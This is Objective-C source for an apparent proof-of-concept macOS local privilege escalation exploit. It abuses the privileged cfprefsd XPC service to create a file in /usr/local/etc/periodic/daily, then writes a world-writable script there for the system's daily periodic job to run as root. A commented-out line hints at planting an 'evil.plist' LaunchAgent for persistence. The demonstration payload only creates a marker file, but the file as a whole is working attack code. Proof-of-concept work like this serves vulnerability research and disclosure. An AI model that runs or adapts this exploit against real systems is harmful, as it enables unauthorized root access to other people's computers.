#import <Foundation/Foundation.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <pwd.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>
#include <xpc/xpc.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>

int main() {
	//CFPreferencesSetAppValue(@"Label", @"You know what should be put here", [(id)NSHomeDirectory() stringByAppendingPathComponent:@"Library/LaunchAgents/evil.plist"]);

	//char *serviceName = "com.apple.cfprefsd.agent";
	char *serviceName = "com.apple.cfprefsd.daemon";
	int status = 0;

	xpc_connection_t conn;
	xpc_object_t msg;

	conn = xpc_connection_create_mach_service(serviceName, NULL, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);
	if (conn == NULL) {
		perror("xpc_connection_create_mach_service");		
	}

	xpc_connection_set_event_handler(conn, ^(xpc_object_t obj) {
		perror("xpc_connection_set_event_handler");
	});

	xpc_connection_resume(conn);

	msg = xpc_dictionary_create(NULL, NULL, 0);
	xpc_dictionary_set_int64(msg, "CFPreferencesOperation", 1);
	xpc_dictionary_set_bool(msg, "CFPreferencesUseCorrectOwner", true);

	//create as root
	//xpc_dictionary_set_string(msg, "CFPreferencesUser", "root");

	//create as user
	xpc_dictionary_set_string(msg, "CFPreferencesUser", "kCFPreferencesCurrentUser");

	xpc_dictionary_set_string(msg, "CFPreferencesHostBundleIdentifier", "prefs");
	//char writable_subpath[0x1000];
	//sprintf(writable_subpath, "%s", "/usr/local/etc/periodic/daily/a.plist");
	xpc_dictionary_set_string(msg, "CFPreferencesDomain", "/usr/local/etc/periodic/daily/a.plist");
	//xpc_dictionary_set_bool(msg, "CFPreferencesAvoidCache", true);
	xpc_dictionary_set_string(msg, "Key", "key");
	xpc_dictionary_set_string(msg, "Value", "value");

	xpc_connection_send_message(conn, msg);
	usleep(1000000);
	
	NSString* script = @"touch /Library/privesc.txt\n";
	NSError *error;
	BOOL succeed = [script writeToFile:@"/usr/local/etc/periodic/daily/111.lpe" atomically:YES encoding:NSUTF8StringEncoding error:&error];
	if (!succeed){
		printf("Couldn't create periodic script :(\n");
	}
	
	char mode[] = "0777";
    int i;
    i = strtol(mode, 0, 8);
	chmod("/usr/local/etc/periodic/daily/111.lpe",i);
}
